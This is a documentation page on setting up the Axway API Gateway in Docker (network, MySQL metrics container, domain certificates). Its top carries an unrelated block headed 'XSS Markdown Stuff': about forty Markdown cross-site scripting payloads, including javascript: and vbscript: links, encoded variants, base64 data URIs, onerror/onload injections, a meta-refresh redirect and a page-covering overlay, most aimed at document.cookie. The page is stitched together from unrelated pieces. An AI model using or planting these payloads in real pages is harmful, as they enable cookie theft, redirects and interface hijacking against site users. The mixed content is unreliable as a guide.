---
title: Set up Docker environment
linkTitle: Set up Docker environment
weight: 30
date: 2019-09-18T00:00:00.000Z
description: Prerequisites and steps you must follow to set up your Docker environment.
---
## XSS Markdown Stuff
[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[clickme](vbscript:alert(document.domain))
_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
[text](http://danlec.com " [@danlec](/danlec) ")
[a](javascript:this;alert(1))
[a](javascript:this;alert(1&#41;)
[a](javascript&#58this;alert(1&#41;)
[a](Javas&#99;ript:alert(1&#41;)
[a](Javas%26%2399;ript:alert(1&#41;)
[a](javascript:alert&#65534;(1&#41;)
[a](javascript:confirm(1)
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1);com)
[a](javascript:window.onerror=confirm;throw%201)
[a](javascript:alert(document.domain&#41;)
[a](javascript://www.google.com%0Aalert(1))
[a]('javascript:alert("1")')
[a](JaVaScRiPt:alert(1))
![a](https://www.google.com/image.png"onload="alert(1))
![a]("onerror="alert(1))
</http://<?php\><\h1\><script:script>confirm(2)
[XSS](.alert(1);)
[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
[ ](http://a?p=[[/onclick=alert(0) .]]) 

## Before you start

Your system must meet the following prerequisites before you can run the scripts to build and deploy API Gateway in Docker containers.

### Set up your Docker environment

You must have the following installed on your local system:

* Docker CE version 18.06 or later on CentOS 7
* Python version 2.7.x
* OpenSSL version 1.1 or later

{{< alert title="Note" color="primary" >}}Axway supports Red Hat Enterprise Linux 7 and CentOS Linux version 7 as the base image for Docker containers. Axway supports deployment on any host operating system, cloud provider, or container orchestration system supported by your Docker version. {{< /alert >}}

For more details on Docker system requirements, see [Docker](https://docs.docker.com/engine/installation/) documentation.

### Set up API Gateway Docker scripts

You must download the following from [Axway Support](https://support.axway.com).

* API Gateway Linux installer
* [APIGateway_7.6.2-8_ScriptsPackageDocker_linux-x86-64_BN27072018.tar.gz](https://support.axway.com/en/downloads/download-details/id/1439671) Docker scripts package.

{{< alert title="Note" color="primary" >}}The scripts in this package applies to any version of API Gateway from 7.6.2 onward.{{< /alert >}}

#### API Gateway licenses

You must have specific API Gateway licenses to run the following:

* API Gateway container
* Admin Node Manager or API Gateway container in Federal Information Processing Standard (FIPS) mode
* API Manager-enabled API Gateway container
* API Gateway Analytics container

#### Unzip and install the Docker scripts

Unzip the Docker scripts package that you downloaded from [Axway Support](https://support.axway.com/)

```
unzip APIGateway_7.7-<n>_ScriptsPackageDocker_linux-x86-64_BN<bn>.zip
```

The unzipped package includes the following:

* Python scripts (`*.py`)
* Docker files
* Quickstart demo

#### Quickstart demo

The Quickstart demo `quickstart.sh` script enables you to quickly deploy a demo of API Gateway in Docker containers. A `readme.md` is also provided, that describes the Quickstart demo and includes a topology diagram.

This script builds a base API Gateway Docker image using an API Gateway Linux installer and a Docker image based on a standard CentOS7 operating system image.

{{< alert title="Caution" color="warning" >}}Docker tries to download the latest CentOS image from a remote registry, which may potentially contain security vulnerabilities. Axway is not responsible for any third-party base O/S images. You must ensure that all base O/S images are up-to-date and apply any security patches if necessary. See [Create a base image based on custom CentOS7/RHEL7](/docs/apim_installation/apigw_containers/docker_script_baseimage/#create-a-base-image-based-on-custom-centos7-rhel7) for details.{{< /alert >}}

For the Quickstart help, run:

```
./quickstart.sh -h
```

The `quickstart.sh` script is intended to simplify deployment of API Gateway in containers, especially for development environments and evaluation use. However, you can also use it as a starting point for customization and modify it to suit your own environment.

## Create a Docker network

You must run the `docker network` command to create a Docker network for the API Gateway domain. This enables all of the containers in the domain to communicate with each another easily (for example, the API Gateway container and Admin Node Manager container). A containerized API Gateway domain must include one Admin Node Manager container and one or more API Gateway containers.

Run the `docker network` command:

```
docker network create api-gateway-domain
```

This example creates a Docker network called `api-gateway-domain`. For more details on the `docker network` command, see the [Docker user documentation](https://docs.docker.com).

### Example API Gateway domain

The example Quick Start API Gateway domain topology provided with the API Gateway Docker scripts includes the following Docker containers:

![Example containerized API Gateway domain](/Images/ContainerGuide/container_gw_domain.png)

This simple API Gateway domain topology is described as follows:

* Container 1 runs an Apache Cassandra database that stores API Manager data.
* Container 2 runs a MySQL database that stores API Gateway metrics data.
* Container 3 runs an API Gateway that writes transaction event logs, and includes API Manager is an optional component. For more details, see [Deploy API Manager or OAuth in Docker containers](/docs/apim_installation/apigw_containers/container_apimgr_oauth).
* Container 4 runs an Admin Node Manager that generates metrics from transaction event logs, which are then read from the metrics database by API Manager and API Gateway Analytics.
* Container 5 runs API Gateway Analytics, which is an optional standalone client of the metrics database. For more details, see [Deploy API Gateway Analytics in Docker containers](/docs/apim_installation/apigw_containers/container_apigateway_analytics).

{{< alert title="Note" color="primary" >}}The example Quick Start domain topology is suitable for a development environment only. For more details, see the readme file provided with the API Gateway Docker scripts.{{< /alert >}}

## Start external data stores

If you are using any external data stores, such as Apache Cassandra for API Manager, or a metrics database for API Manager or API Gateway Analytics, you must start these data stores.

### Start Apache Cassandra

Deploying a Cassandra container is only recommended for development environments. In a production environment, you must configure Cassandra for high availability (HA) as detailed in
[Configure a Cassandra HA cluster](/docs/cass_admin/cassandra_config/).

For details on starting Apache Cassandra in a Docker container, see [Docker](https://hub.docker.com/_/cassandra) documentation.

### Start the metrics database

If you are using a metrics database, you can use the `docker run` command to start a database container.

```
cd emt_containers-<version>
cp quickstart/mysql-analytics.sql /tmp/sql
docker run -d --name metricsdb --network=api-gateway-domain -v /tmp/sql:/docker-entrypoint-initdb.d -e MYSQL_ROOT_PASSWORD=root01 -e MYSQL_DATABASE=metrics mysql:5.7
```

The above `docker run` command performs the following:

* Downloads a MySQL 5.7 Docker image from the public Docker registry.
* Mounts the host directory `/tmp/sql` (containing a MySQL metrics database creation script) inside the container.
* Uses environment variables `MYSQL_ROOT_PASSWORD` and `MYSQL_DATABASE` to specify the database root password and the database name.
* Starts a MySQL container named `metricsdb`.

## Generate domain SSL certificates

To secure the communications between the Admin Node Manager and API Gateways, you can use the `gen_domain_cert.py` script to generate a self-signed CA certificate for a domain, or a Certificate Signing Request (CSR) to be signed by an external Certificate Authority (CA).

{{< alert title="Note" color="primary" >}}If you already have a domain certificate (for example, from another API Gateway installation) you can skip this section. You can specify your existing domain certificate (certificate and private key in .pem format) to the `build_anm_image.py` and `build_gw_image.py` scripts. You cannot use one domain certificate for both a container deployment and a classic deployment if they are running in parallel.{{< /alert >}}

### Generate domain certificates script options

You must specify the following as options when using the `gen_domain_cert.py` script:

* Domain identifier
* Passphrase for the domain private key

This script also supports additional options when generating certificates. For example:

* Specify a signing algorithm (SHA256, SHA384, or SHA512)
* Generate a CSR
* Specify custom values for the fields in the domain certificate (for example, organization)

For the latest script usage and options, run the script with no options, or with the `-h` option.

```
cd emt_containers-<version>
./gen_domain_cert.py -h
```

### Generate a default certificate and key

The following example creates a certificate and private key using default values.

{{< alert title="Caution" color="warning" >}} Do not use default options on production systems. The `--default-cert` option is provided only as a convenience for development environments.{{< /alert >}}

```
cd emt_containers-<version>
./gen_domain_cert.py --default-cert
```

This example creates a default certificate and private key:

* The certificate uses a domain identifier of `DefaultDomain`
* The certificate and key are stored in the `certs/DefaultDomain` directory
* The certificate uses a default passphrase

### Generate a self-signed certificate and key

The following example creates a self-signed certificate and private key.

```
cd emt_containers-<version>
./gen_domain_cert.py --domain-id=mydomain --pass-file=/tmp/pass.txt
```

This example creates a self-signed certificate and private key:

* The certificate uses a domain identifier of `mydomain`.
* The certificate and key are stored in the `certs/mydomain` directory
* The certificate uses a specified passphrase

### Generate a CSR

The following example creates a certificate signing request (CSR).

* You must send the generated CSR to a CA for signing.
* When running the scripts to build Admin Node Manager or API Gateway images, specify the certificate and private key returned from the CA, and not the CSR.

```
cd emt_containers-<version>
./gen_domain_cert.py --domain-id=mydomain --pass-file=/tmp/pass.txt --out=csr --O=MyOrg
```

This example creates a CSR that:

* Uses a domain identifier of `mydomain`
* Is stored in the `certs/mydomain` directory
* Uses a specified passphrase and organization
